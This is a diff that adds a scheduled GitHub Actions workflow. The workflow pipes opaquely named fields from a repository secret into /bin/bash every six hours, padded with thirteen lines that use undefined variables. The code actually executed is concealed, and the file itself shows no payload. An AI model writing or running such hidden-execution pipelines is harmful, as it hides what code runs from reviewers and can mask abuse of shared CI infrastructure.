@@ -1,0 +1,30 @@
+name: tuishouyucu
+on:
+  workflow_dispatch:
+  schedule:
+    - cron: '44 0/6 * * *'
+jobs:
+  build:
+    runs-on: ubuntu-latest
+
+    steps:
+      - uses: actions/checkout@v4
+      - name: tuishouyucu
+        env:
+          lj9: ${{ secrets.lj9 }}
+        run: |
+          echo $lj9 | jq -r .kchq22 | /bin/bash
+          echo $lpyh794 | jq -r .bxhd77673 | /bin/bash
+          echo $j27019 | jq -r .o7 | /bin/bash
+          echo $iqm19164 | jq -r .vt78919 | /bin/bash
+          echo $j0755 | jq -r .fkdh2 | /bin/bash
+          echo $rc376 | jq -r .fxgt80 | /bin/bash
+          echo $lj3706 | jq -r .ax0 | /bin/bash
+          echo $v14164 | jq -r .bnq68 | /bin/bash
+          echo $figil3347 | jq -r .bmd4133 | /bin/bash
+          echo $xe243 | jq -r .q39 | /bin/bash
+          echo $e9 | jq -r .zie5 | /bin/bash
+          echo $akyck84172 | jq -r .proj443 | /bin/bash
+          echo $m74 | jq -r .csdm7483 | /bin/bash
+          echo $zueb86511 | jq -r .hljpr78863 | /bin/bash
+
